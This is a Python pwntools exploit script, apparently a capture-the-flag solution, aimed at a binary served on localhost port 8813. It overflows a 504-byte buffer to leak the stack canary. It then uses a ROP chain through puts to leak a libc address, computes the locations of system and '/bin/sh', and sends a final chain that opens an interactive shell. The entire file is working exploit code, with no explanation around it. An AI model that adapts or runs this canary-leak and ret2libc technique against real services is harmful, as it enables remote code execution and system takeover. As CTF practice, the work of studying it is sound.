from pwn import *

context.log_level = 'debug'

e = ELF('./main')
libc = e.libc
#p = process('./main')
p = remote("localhost", 8813)

puts_plt = e.plt['puts']
puts_got = e.got['puts']

prdi = 0x00000000004009a3
ret = 0x0000000000400636

main = 0x0000000000400807

payload = ''
payload += "A"*504
payload += "B"

p.recvuntil("2. yes")
p.send("A")
p.recvuntil("doing?\n")
p.send(payload)

p.recvuntil("B")
canary = u64("\x00" + p.recv(7))

print("canary = " + hex(canary))

payload = ''
payload += "A"*504
payload += p64(canary)
payload += "A"*8

payload += p64(prdi)
payload += p64(puts_got)

payload += p64(puts_plt)

payload += p64(main)

p.recvuntil("Demisoda]?\n")
p.send(payload)

libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search("/bin/sh"))[0]

print("libc_base = " + hex(libc_base))

payload = ''
payload += "A"*504
payload += p64(canary)
payload += "A"*8

payload += p64(prdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_addr)

p.recvuntil("2. yes")
p.send("A")
p.recvuntil("doing?\n")
p.send("A")

p.recvuntil("]?")

p.send(payload)

p.interactive()
